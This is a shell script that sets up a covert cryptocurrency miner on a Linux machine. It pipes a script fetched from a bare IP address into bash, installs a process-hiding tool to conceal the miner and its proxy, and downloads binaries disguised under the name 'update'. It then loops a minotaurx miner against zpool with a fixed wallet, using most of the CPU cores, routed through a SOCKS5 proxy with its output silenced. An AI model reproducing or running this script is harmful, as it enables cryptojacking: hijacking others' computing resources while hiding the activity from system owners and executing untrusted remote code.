#!/bin/sh

apt update >/dev/null;apt -y install npm automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
if [[ "" !=  "$PID" ]]; then
  echo "killing $PID"
  kill -9 $PID
fi

sleep 2

curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Jspa_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo "You will be using : $used_num_of_cores cores"
echo ""

sleep 2

wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

sleep 2

source ~/.bashrc

sleep 2

nvm install 21.6.1

sleep 2

npm

sleep 2

npm install -g npm@10.4.0

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add jay 1>/dev/null 2>&1

sleep 2

wget -q https://raw.githubusercontent.com/velilemaqolombeni/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz > /dev/null

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

echo " "
echo " "

echo "******************************************************************"

./update/update curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "


sleep 2

./update/update wget -q https://raw.githubusercontent.com/velilemaqolombeni/update/main/jay.tar.gz > /dev/null

sleep 2

tar -xf jay.tar.gz

sleep 2

netstat -ntlp

sleep 2

echo " "
echo " "

sleep 2

wget -q http://security.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.22_amd64.deb >/dev/null

sleep 2
dpkg -i libssl1.1_1.1.1f-1ubuntu2.22_amd64.deb
sleep 2

echo "Your worker name will be : $currentdate"

echo ""
echo ""

sleep 2

ls

echo ""
echo ""

sleep 2

while true
do
./jay -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA,zap=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
sleep 10
done
